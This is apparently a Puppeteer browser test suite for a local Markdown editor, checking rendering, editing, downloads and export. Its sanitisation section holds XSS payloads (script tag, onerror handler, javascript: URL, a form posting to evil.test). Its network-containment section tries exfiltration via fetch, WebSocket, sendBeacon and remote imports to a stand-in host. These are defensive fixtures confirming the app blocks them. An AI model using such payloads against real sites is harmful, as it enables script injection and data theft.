/* ---------------------------------------------------------------------------
 * End-to-end tests in a real browser.
 *
 * They run against the built file, served the way production serves it. The
 * point is not that buttons respond, but that the project's promise holds: the
 * browser must refuse every network egress, the preview must neutralise hostile
 * HTML, and the standalone file must start on its own without carrying the
 * user's document with it.
 *
 * puppeteer is deliberately not a project dependency: it downloads a full
 * Chrome, which would weigh down `npm install` and the image build for
 * everyone.
 *
 *   npm run dev &                      # or: docker run -p 8080:8080 md-editor
 *   npm install --no-save puppeteer
 *   node test/browser.mjs
 *
 * Environment variables:
 *   TARGET                        URL under test (default http://localhost:8080/)
 *   PUPPETEER_EXECUTABLE_PATH     browser to use
 * ------------------------------------------------------------------------- */

import puppeteer from "puppeteer";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const TARGET = process.env.TARGET || "http://localhost:8080/";
const DL = mkdtempSync(join(tmpdir(), "md-editor-test-"));
mkdirSync(DL, { recursive: true });

let fails = 0;
const ok = (name, cond, detail = "") => {
  console.log(`  ${cond ? "ok  " : "FAIL"}  ${name}${detail ? " -- " + detail : ""}`);
  if (!cond) fails++;
};
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

const browser = await puppeteer.launch({
  headless: "shell",
  executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
  args: ["--no-sandbox", "--disable-dev-shm-usage"],
});

// Browser advisories that say nothing about the application. Served over plain
// HTTP on an IP address, Chrome reports that it ignored Cross-Origin-Opener-
// Policy because the origin is not trustworthy -- which is the documented
// consequence of an insecure origin, not a fault in the page.
const BENIGN_CONSOLE = [
  /Cross-Origin-Opener-Policy header has been ignored/i,
];

async function newPage() {
  const page = await browser.newPage();
  await page.setViewport({ width: 1280, height: 800 });
  const errors = [], csp = [];
  page.on("pageerror", (e) => errors.push(String(e)));
  page.on("console", (m) => {
    const t = m.text();
    if (m.type() === "error" && !BENIGN_CONSOLE.some((re) => re.test(t))) errors.push(t);
    if (/Content Security Policy/i.test(t)) csp.push(t);
  });
  return { page, errors, csp };
}

const { page, errors, csp } = await newPage();
const cdp = await page.createCDPSession();

/** Pick a button by its exact label. */
const btn = async (label) => {
  for (const e of await page.$$("button")) {
    if ((await e.evaluate((n) => n.textContent)) === label) return e;
  }
  throw new Error(`button not found: ${label}`);
};

async function clearSource() {
  await page.click(".cm-content");
  await page.keyboard.down("Control");
  await page.keyboard.press("KeyA");
  await page.keyboard.up("Control");
  await page.keyboard.press("Backspace");
}

/** Replace the source pane content by simulating real typing. */
async function retype(content) {
  await clearSource();
  await page.type(".cm-content", content);
  await wait(400);
}

/**
 * Drop content in as a single block, like a paste.
 *
 * Use this whenever the source contains HTML: lang-markdown delegates HTML
 * blocks to @codemirror/lang-html, whose `autoCloseTags` adds the closing tag
 * when "&gt;" is typed. Typed character by character, an already complete
 * fragment would come out with one closing tag too many.
 */
async function pasteSource(content) {
  await clearSource();
  await cdp.send("Input.insertText", { text: content });
  await wait(500);
}

/* ========================= 1. loading ========================= */
console.log("\n--- loading and start-up ---");
await page.goto(TARGET, { waitUntil: "networkidle0" });
await wait(600);

ok("no JavaScript error at start-up", errors.length === 0, errors.slice(0, 3).join(" | "));
ok("no CSP violation at start-up", csp.length === 0, csp.slice(0, 3).join(" | "));
ok("the toolbar is rendered", (await page.$(".tb")) !== null);
ok("CodeMirror is mounted", (await page.$(".cm-editor .cm-content")) !== null);
ok("the preview renders the sample document",
  (await page.$eval("#preview h1", (e) => e.textContent).catch(() => null)) === "Local Markdown editor");
ok("GFM tables are rendered", (await page.$$eval("#preview table th", (e) => e.length)) === 2);

/* ========================= 2. editing ========================= */
console.log("\n--- editing and rendering ---");
// markdown() installs markdownKeymap, which continues lists automatically:
// after "- alpha" plus Enter the next dash is already there. So type the way a
// human would, without repeating the marker.
await retype("# Hello\n\nA **test** with `some code`.\n\n- alpha\nbeta");

const lines = await page.$$eval(".cm-line", (ls) => ls.map((l) => l.textContent));
ok("automatic list continuation works",
  lines.at(-1) === "- beta", JSON.stringify(lines.slice(-2)));
ok("the typed heading appears in the preview",
  (await page.$eval("#preview h1", (e) => e.textContent)) === "Hello");
ok("bold is rendered", (await page.$$eval("#preview strong", (e) => e.length)) === 1);
ok("inline code is rendered", (await page.$$eval("#preview code", (e) => e.length)) === 1);
ok("the list is rendered", (await page.$$eval("#preview li", (e) => e.length)) === 2);

const sb = await page.$eval(".sb", (e) => e.textContent);
ok("the status bar counts words", /\d+ words/.test(sb), sb.trim());
ok("the modified indicator is on", /modified/.test(sb));

// --- maths ---------------------------------------------------------------
// KaTeX is the one dependency that would normally reach for a font over the
// network, so it is checked here rather than only in the round-trip suite.
await pasteSource("Inline $E = mc^2$ and:\n\n$$\n\\frac{a}{b}\n$$\n\nNot maths: $5 and $10.\n");

ok("inline maths is rendered", (await page.$$("#preview .math-inline .katex")).length === 1);
ok("display maths is rendered", (await page.$$("#preview .math-block .katex")).length === 1);
ok("maths carries MathML for screen readers",
  (await page.$$("#preview .katex-mathml annotation")).length === 2,
  String((await page.$$("#preview .katex-mathml annotation")).length));
ok("currency is not mistaken for maths",
  (await page.$eval("#preview", (e) => e.textContent)).includes("$5 and $10"));

// The fonts are inlined as data: URIs at build time; a single missed one would
// show up as a font-src violation, and the formulas would fall back to a serif
// whose metrics KaTeX does not expect.
const fontsLoaded = await page.evaluate(async () => {
  await document.fonts.ready;
  return [...document.fonts].filter((f) => f.family.startsWith("KaTeX") && f.status === "loaded").length;
});
ok("KaTeX fonts load from the document itself", fontsLoaded > 0, String(fontsLoaded));
ok("no CSP violation from rendering maths", csp.length === 0, csp.slice(0, 2).join(" | "));

/* ========================= 3. sanitisation ========================= */
console.log("\n--- HTML sanitisation ---");
await page.evaluate(() => { window.__xss = 0; });
await retype([
  "<script>window.__xss=1<\/script>",
  '<img src=x onerror="window.__xss=1">',
  '<a href="javascript:window.__xss=1">link</a>',
  '<iframe src="https://example.com"></iframe>',
  "<style>body{display:none}</style>",
  '<form action="https://evil.test"><input name="a"></form>',
  "[ordinary link](https://example.com)",
].join("\n\n"));

const rendered = await page.$eval("#preview", (e) => e.innerHTML);
ok("no script executed", (await page.evaluate(() => window.__xss)) === 0);
ok("no <script> tag kept", !/<script/i.test(rendered));
ok("no onerror handler kept", !/onerror/i.test(rendered));
ok("no javascript: URL kept", !/javascript:/i.test(rendered));
ok("no <iframe> kept", !/<iframe/i.test(rendered));
ok("no <style> kept", !/<style/i.test(rendered));
ok("no <form> kept", !/<form/i.test(rendered));
ok("legitimate links get rel=noopener noreferrer",
  await page.$eval('#preview a[href^="https://example.com"]',
    (a) => a.rel === "noopener noreferrer" && a.target === "_blank").catch(() => false));
ok("the interface survives the injection", (await page.$(".tb")) !== null);

/* ========================= 4. network containment ========================= */
console.log("\n--- network containment ---");
// Return values prove nothing here: the WebSocket constructor throws no
// synchronous exception, and sendBeacon() returns `true` as soon as the request
// is queued, before the CSP steps in. The only authoritative witness is the
// `securitypolicyviolation` event.
const violations = await page.evaluate(async () => {
  const seen = [];
  document.addEventListener("securitypolicyviolation", (e) =>
    seen.push(e.effectiveDirective + " -> " + e.blockedURI));

  try { await fetch("https://example.test/leak"); } catch {}
  try { new WebSocket("wss://example.test/leak"); } catch {}
  try { navigator.sendBeacon("https://example.test/leak", "secret"); } catch {}
  try { new Image().src = "https://example.test/pixel.png"; } catch {}
  try { await import("https://example.test/mod.js"); } catch {}

  await new Promise((r) => setTimeout(r, 1200));
  return seen;
});
const blocked = (f) => violations.some((v) => v.includes(f));
ok("fetch() is blocked by connect-src",
  blocked("connect-src -> https://example.test/leak"), violations.join(" | "));
ok("WebSocket is blocked by connect-src", blocked("connect-src -> wss://example.test/leak"));
ok("sendBeacon is blocked by connect-src",
  violations.filter((v) => v.includes("connect-src -> https://example.test/leak")).length >= 2);
ok("remote images are blocked by img-src",
  blocked("img-src -> https://example.test/pixel.png"));
ok("remote dynamic imports are blocked", blocked("https://example.test/mod.js"));

/* ========================= 5. interface ========================= */
console.log("\n--- interface ---");
const display = (sel) => page.$eval(sel, (e) => getComputedStyle(e).display);

// There is no layout control: source and live preview are always side by side.
ok("source and live preview are shown side by side",
  (await display(".pane-editor")) !== "none" && (await display("#preview")) !== "none");
ok("no layout control is present", await page.evaluate(() =>
  ![...document.querySelectorAll(".tb button")].some((b) =>
    ["Source", "Split", "Preview"].includes(b.textContent))));

const t0 = await page.evaluate(() => document.documentElement.dataset.theme);
await (await btn("Theme")).click();
const t1 = await page.evaluate(() => document.documentElement.dataset.theme);
ok("the theme toggles", t0 !== t1, `${t0} -> ${t1}`);
await (await btn("Theme")).click();

await (await btn("?")).click();
ok("the About dialog opens", (await page.$(".sheet")) !== null);
await (await btn("Close")).click();
ok("the About dialog closes", (await page.$(".sheet")) === null);

/* ========================= 6. local draft ========================= */
console.log("\n--- local draft ---");
const draft = () => page.evaluate(() => localStorage.getItem("mdedit.draft"));
ok("nothing is stored by default", (await draft()) === null);
await page.click(".chk input");
await wait(300);
ok("the draft is written once the box is ticked", (await draft()) !== null);
await page.click(".chk input");
await wait(300);
ok("the draft is erased when unticked", (await draft()) === null);

/* ========================= 7. standalone application ========================= */
console.log("\n--- downloadable standalone file ---");
await cdp.send("Browser.setDownloadBehavior", { behavior: "allow", downloadPath: DL });

const CANARY = "MY ABSOLUTE SECRET 4242";
await retype(CANARY);
await (await btn("Download app")).click();

const standalonePath = join(DL, "md-editor.html");
for (let i = 0; i < 40 && !existsSync(standalonePath); i++) await wait(200);
ok("md-editor.html is downloaded", existsSync(standalonePath), readdirSync(DL).join(","));

if (existsSync(standalonePath)) {
  const file = readFileSync(standalonePath, "utf8");
  ok("the standalone file does not contain the user's document", !file.includes(CANARY));

  const fileJs = file.match(/<script id="app-js">([\s\S]*?)<\/script>/)[1];
  const declared = file.match(/script-src 'sha256-([^']+)'/)[1];
  ok("the standalone file's digest matches its script",
    createHash("sha256").update(fileJs, "utf8").digest("base64") === declared);

  // The decisive test: the downloaded file must start on its own, from file://.
  const { page: p2, errors: e2, csp: c2 } = await newPage();
  await p2.goto("file://" + standalonePath, { waitUntil: "networkidle0" });
  await wait(800);
  ok("the standalone file starts from file:// without error", e2.length === 0, e2.slice(0, 2).join(" | "));
  ok("the standalone file raises no CSP violation", c2.length === 0, c2.slice(0, 2).join(" | "));
  ok("the standalone file mounts CodeMirror", (await p2.$(".cm-editor .cm-content")) !== null);
  ok("the standalone file renders the preview",
    (await p2.$eval("#preview h1", (e) => e.textContent).catch(() => null)) === "Local Markdown editor");
  await p2.close();
}

/* ========================= 8. Save as ========================= */
console.log("\n--- Save as ---");

// The File System Access API only exists in a secure context. Over plain HTTP
// on an IP address it is absent, and both buttons fall back to a download --
// which is exactly when "Save as" must still ask for a name, or it becomes
// indistinguishable from "Save".
const hasFSA = await page.evaluate(() => typeof window.showSaveFilePicker === "function");

if (hasFSA) {
  ok("the file picker is available on this origin, Save as uses it", true,
    "run against an http:// IP origin to exercise the fallback");
} else {
  let asked = null;
  page.once("dialog", async (d) => { asked = d.message(); await d.dismiss(); });
  await (await btn("Save as")).click();
  await wait(500);
  ok("without a file picker, Save as asks for a file name",
    asked !== null && /name/i.test(asked), String(asked));
}

/* ========================= 9. editing the rendered document ========================= */
console.log("\n--- editing the rendered document ---");

/** Source pane text, reassembled from the displayed lines. */
const sourceText = () =>
  page.$$eval(".cm-line", (ls) => ls.map((l) => l.textContent).join("\n"));

const editing = () =>
  page.$eval(".panes", (e) => e.classList.contains("editing"));

/**
 * Put a document in the source, then open the rendered editor on it.
 *
 * The source pane exists only in the split view, so anything that writes to it
 * has to happen before switching. That constraint is the whole point of the
 * design: the two surfaces are never on screen together.
 */
async function editRendered(markdown) {
  if (await editing()) await (await btn("Back to split")).click();
  await wait(300);
  await pasteSource(markdown);
  await (await btn("Edit preview")).click();
  await wait(400);
}

/** Return to the split view and read the regenerated source. */
async function splitAndRead() {
  await (await btn("Back to split")).click();
  await wait(400);
  return sourceText();
}

/** Select everything in the rendered editor. */
async function selectAllRendered() {
  await page.click("#rich .ProseMirror");
  await wait(250);
  await page.keyboard.down("Control");
  await page.keyboard.press("KeyA");
  await page.keyboard.up("Control");
  await wait(150);
}

await retype("# Start\n\nInitial text.");
ok("the ribbon is hidden in the split view",
  (await page.$eval(".rb", (e) => getComputedStyle(e).display)) === "none");

await (await btn("Edit preview")).click();
await wait(400);

// Editing takes the full width: that is what keeps the two surfaces apart, and
// with them the whole class of synchronisation races.
ok("editing hides the source pane",
  (await page.$eval(".pane-editor", (e) => getComputedStyle(e).display)) === "none");
ok("editing hides the splitter",
  (await page.$eval(".divider", (e) => getComputedStyle(e).display)) === "none");
ok("the button label becomes Back to split",
  (await page.$$eval(".tb button", (bs) => bs.map((b) => b.textContent))).includes("Back to split"));
ok("the formatting ribbon appears",
  (await page.$eval(".rb", (e) => getComputedStyle(e).display)) !== "none");
ok("the rendered editor is mounted", (await page.$("#rich .ProseMirror")) !== null);
ok("the read-only preview is hidden",
  (await page.$eval("#preview", (e) => getComputedStyle(e).display)) === "none");
ok("the rendered editor picks up the current document",
  (await page.$eval("#rich h1", (e) => e.textContent).catch(() => null)) === "Start");

// --- typing in the rendered document reaches the source ---
await selectAllRendered();
await page.keyboard.press("Backspace");
await page.keyboard.type("Written in the preview");
await wait(500);
ok("typing in the rendered document updates the source",
  (await splitAndRead()).includes("Written in the preview"), await sourceText());

// --- the ribbon really produces Markdown ---
await editRendered("plain text");
await selectAllRendered();
await (await btn("B")).click();
await wait(400);
ok("the Bold button produces **bold** in the source",
  /\*\*plain text\*\*/.test(await splitAndRead()), await sourceText());

await editRendered("heading text");
await page.click("#rich .ProseMirror");
await wait(250);
await page.select(".rb-select", "h2");
await wait(400);
ok("the style selector produces a level 2 heading",
  /^##\s/.test((await splitAndRead()).trim()), await sourceText());

// --- lists and tasks ---
await editRendered("alpha");
await selectAllRendered();
await (await btn("Tasks")).click();
await wait(400);
ok("the Tasks button produces a checkbox",
  /^-\s\[ \]\salpha/.test((await splitAndRead()).trim()), await sourceText());

await (await btn("Edit preview")).click();
await wait(400);
await page.click("#rich .task-check");
await wait(400);
ok("clicking the box ticks the task",
  (await page.$eval("#rich li.task-item", (e) => e.getAttribute("data-checked"))) === "true");
ok("the ticked state reaches the source",
  /^-\s\[x\]\salpha/.test((await splitAndRead()).trim()), await sourceText());

// --- tables ---
await editRendered("");
await page.click("#rich .ProseMirror");
await (await btn("Table")).click();
await wait(500);
ok("the table is rendered in the editor",
  (await page.$$eval("#rich table th", (e) => e.length)) === 3);
ok("table tools appear when the cursor is inside one",
  (await page.$eval(".rb-group", (e) => getComputedStyle(e).display)) !== "none");
await (await btn("+Col")).click();
await wait(400);
ok("adding a column shows up in the editor",
  (await page.$$eval("#rich table th", (e) => e.length)) === 4);
const tableSource = await splitAndRead();
ok("the table reaches the source as a GFM table",
  /\|\s*\|/.test(tableSource) && /\|\s*---\s*\|/.test(tableSource), tableSource.slice(0, 80));

// --- the source stays authoritative ---
await retype("## From the source\n\nWith some *style*.");
await wait(400);
ok("the split preview follows the source",
  (await page.$eval("#preview h2", (e) => e.textContent).catch(() => null)) === "From the source");
await (await btn("Edit preview")).click();
await wait(400);
ok("the rendered editor opens on the current source",
  (await page.$eval("#rich h2", (e) => e.textContent).catch(() => null)) === "From the source");
ok("emphasis typed in the source is carried over",
  (await page.$$eval("#rich em", (e) => e.length)) === 1);
await (await btn("Back to split")).click();
await wait(400);

// --- raw HTML survives the round trip ---
const HTML_FIXTURE = "Before\n\n<details><summary>More</summary>\nhidden\n</details>\n\nAfter";
await pasteSource(HTML_FIXTURE);
ok("the source receives the HTML fragment unaltered",
  (await sourceText()) === HTML_FIXTURE, await sourceText());

await (await btn("Edit preview")).click();
await wait(400);
ok("raw HTML is marked as non-editable in the rendered editor",
  (await page.$("#rich .raw-html")) !== null);

// Edit the neighbouring paragraph, not the HTML block. Clicking the latter
// would select it as an atomic node -- typing would then replace it, which is
// normal editor behaviour but not what is under test here.
await page.click("#rich p");
await page.keyboard.press("End");
await page.keyboard.type(" !");
await wait(400);
const afterEdit = await splitAndRead();
ok("raw HTML survives an edit elsewhere in the document",
  afterEdit.includes("<details><summary>More</summary>"), afterEdit);
ok("the neighbouring edit did happen", afterEdit.includes("Before !"), afterEdit);

// --- returning to split restores everything ---
ok("the source pane comes back",
  (await page.$eval(".pane-editor", (e) => getComputedStyle(e).display)) !== "none");
ok("the read-only preview comes back",
  (await page.$eval("#preview", (e) => getComputedStyle(e).display)) !== "none");
ok("the ribbon disappears",
  (await page.$eval(".rb", (e) => getComputedStyle(e).display)) === "none");
ok("the button label returns to Edit preview",
  (await page.$$eval(".tb button", (bs) => bs.map((b) => b.textContent))).includes("Edit preview"));


/* ========================= 10. exporting the rendered document ========================= */
console.log("\n--- exporting the rendered document ---");
await retype("# Report\n\n**Exported** content.");
await (await btn("Export HTML")).click();

const exportPath = join(DL, "untitled.html");
for (let i = 0; i < 40 && !existsSync(exportPath); i++) await wait(200);
const exported = existsSync(exportPath) ? readFileSync(exportPath, "utf8") : "";
ok("the rendered document is exported as HTML", exported.length > 0, readdirSync(DL).join(","));
ok("the export contains the rendered document", /<h1[^>]*>Report<\/h1>/.test(exported));
ok("the export carries its own locked-down CSP", /default-src 'none'/.test(exported));
ok("the export contains no script", !/<script/i.test(exported));

await browser.close();
console.log();
if (fails) {
  console.error(`  ${fails} test(s) failed\n`);
  process.exit(1);
}
console.log("  all tests pass\n");
